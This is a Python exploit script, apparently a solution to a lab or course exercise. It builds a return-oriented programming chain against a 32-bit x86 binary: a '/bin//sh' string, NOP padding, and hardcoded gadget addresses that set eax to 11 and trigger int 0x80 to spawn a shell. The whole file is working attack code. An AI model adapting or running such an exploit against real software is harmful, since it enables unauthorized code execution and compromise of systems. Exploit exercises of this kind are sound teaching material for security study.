#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
binStr = pack("<I", 0xfffeb308)*4 + b"\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
padding_len = 88
padding = b"\x90"*padding_len
gadgetAddrs = [
    # This zeroes out %eax
    pack("<I", 0x08056140),
    # This moves address of null for string into %edx
    pack("<I", 0x0806eacb),
    pack("<I", 0xfffeb314), #Address to pop
    # This moves %eax -> M[%edx]
    pack("<I", 0x08056b85),
    # This moves address of null for string into %edx
    pack("<I", 0x0806eacb),
    pack("<I", 0xfffeb308), #Address to pop
    # This moves %eax -> M[%edx]
    pack("<I", 0x08056b85),
    # This moves %eax -> %edx
    pack("<I", 0x080585a3),
    pack("<I", 0x01010101),
    pack("<I", 0x01010101),
    pack("<I", 0x01010101),
    pack("<I", 0x01010101),
    # This loads string pointer into %ebx
    pack("<I", 0x0806eaf2),
    pack("<I", 0xfffeb308),
    pack("<I", 0xfffeb30c),
    # This increments %eax to 1
    pack("<I", 0x0805e7dc),
    pack("<I", 0x0805e7dc),
    # This increments %eax to 2
    pack("<I", 0x0805e7dc),
    pack("<I", 0x0805e7dc),
    # This increments %eax to 3
    pack("<I", 0x0805e7dc),
    pack("<I", 0x0805e7dc),
    # This increments %eax to 4
    pack("<I", 0x0805e7dc),
    pack("<I", 0x0805e7dc),
    # This increments %eax to 5
    pack("<I", 0x0805e7dc),
    pack("<I", 0x0805e7dc),
    # This increments %eax to 6
    pack("<I", 0x0805e7dc),
    pack("<I", 0x0805e7dc),
    # This increments %eax to 7
    pack("<I", 0x0805e7dc),
    pack("<I", 0x0805e7dc),
    # This increments %eax to 8
    pack("<I", 0x0805e7dc),
    pack("<I", 0x0805e7dc),
    # This increments %eax to 9
    pack("<I", 0x0805e7dc),
    pack("<I", 0x0805e7dc),
    # This increments %eax to 10
    pack("<I", 0x0805e7dc),
    pack("<I", 0x0805e7dc),
    # This increments %eax to 11
    pack("<I", 0x0805e7dc),
    pack("<I", 0x0805e7dc),
    # This calls int $0x80
    pack("<I", 0x08049603),
]
gadgetStr = b""
for gadget in gadgetAddrs:
    gadgetStr += gadget
print(gadgetStr)
sys.stdout.buffer.write(binStr + padding + gadgetStr)